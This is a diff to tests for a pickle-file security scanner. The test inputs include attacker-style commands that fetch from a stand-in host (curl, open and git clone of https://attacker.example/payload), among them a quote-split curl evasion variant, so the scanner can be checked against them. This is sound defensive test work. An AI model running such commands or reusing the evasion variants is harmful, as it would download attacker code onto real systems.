@@ -1304,6 +1304,7 @@ def test_scan_stream_encoded_decoded_byte_budgets_fail_closed(encoding: str) -> 
         "Use documentation example metadata <(git clone https://attacker.example/payload )",
         'f"{client:https://attacker.example/payload}"',
         "'/usr/bin/curl' 'https://attacker.example/payload'",
+        "['/usr/bin/curl', 'https://attacker.example/payload']",
         "'/usr/bin/open' 'https://attacker.example/payload'",
         "OPEN_MODE='safe' '/usr/bin/open' 'https://attacker.example/payload'",
         "metadata='docs'; '/usr/bin/cu''rl' 'https://attacker.example/payload'",
@@ -1338,6 +1339,7 @@ def test_scan_stream_encoded_decoded_byte_budgets_fail_closed(encoding: str) -> 
         "process-substitution",
         "f-string-format-dispatch",
         "adjacent-curl-argv",
+        "list-curl-argv",
         "adjacent-open-argv",
         "assignment-adjacent-open-argv",
         "assignment-split-adjacent-curl-argv",
@@ -1352,6 +1354,35 @@ def test_scan_stream_keeps_executable_pickle_urls_actionable(loader: str, protoc
     result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="network-loader.pkl")
 
     _assert_critical_explicit_url(result, "https://attacker.example/payload")
+
+
+def test_run_root_raw_detectors_filters_completed_raw_slice(monkeypatch: pytest.MonkeyPatch) -> None:
+    scanner = PickleScanner()
+    result = scanner._create_result()
+    data = pickle.dumps({"metadata": "https://docs.example.invalid/reference/os.system(command)"}, protocol=4)
+    result.metadata.update(
+        {
+            "pickle_report_status": "complete",
+            "pickle_verdict": "clean",
+            "pickle_coverage": {
+                "bytes_scanned": len(data),
+                "bytes_total": len(data) + 1024,
+                "raw_scan_complete": True,
+                "opcode_scan_complete": True,
+            },
+        }
+    )
+    observed_allow_filtering: list[bool] = []
+
+    def record_filtering(scan_data: bytes, *, allow_filtering: bool) -> bytes:
+        observed_allow_filtering.append(allow_filtering)
+        return scan_data
+
+    monkeypatch.setattr(pickle_scanner, "_pickle_literal_url_stripped_scan_view", record_filtering)
+
+    scanner._run_root_raw_detectors(data, result, "slice.pkl")
+
+    assert observed_allow_filtering == [True]
 
 
 def test_scan_stream_keeps_network_reduce_url_actionable() -> None:
